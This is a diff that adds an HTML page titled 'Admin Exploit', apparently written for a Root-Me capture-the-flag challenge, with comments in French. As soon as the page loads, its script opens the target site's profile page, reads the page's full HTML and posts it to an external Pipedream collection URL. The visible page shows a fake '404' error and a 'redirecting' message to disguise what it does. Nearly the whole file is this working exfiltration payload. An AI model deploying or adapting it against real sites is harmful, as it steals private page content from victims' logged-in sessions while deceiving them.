@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Exploit</title>
+    <script type="text/javascript">
+        function exploit() {
+            // Ouvre la page Profile où se trouve le secret
+            var profileWindow = window.open('http://challenge01.root-me.org:58003/profile', '_blank');
+
+            // Attendre que la page Profile soit complètement chargée
+            profileWindow.onload = function() {
+                try {
+                    // Récupérer tout le contenu HTML de la page Profile
+                    var fullHTML = profileWindow.document.documentElement.outerHTML;
+
+                    // Envoyer la page complète à ton workflow Pipedream
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://eojivep1vj04e9q.m.pipedream.net', true); // Utilise ton URL Pipedream ici
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.send('html=' + encodeURIComponent(fullHTML));
+                } catch (e) {
+                    console.error('Erreur lors de la récupération du HTML : ', e);
+                }
+            };
+        }
+
+        // Lancer l'exploit dès que la page est chargée
+        window.onload = exploit;
+    </script>
+</head>
+<body>
+    <h1>Erreur 404 - Page introuvable</h1>
+    <p>Redirection en cours...</p>
+</body>
+</html>
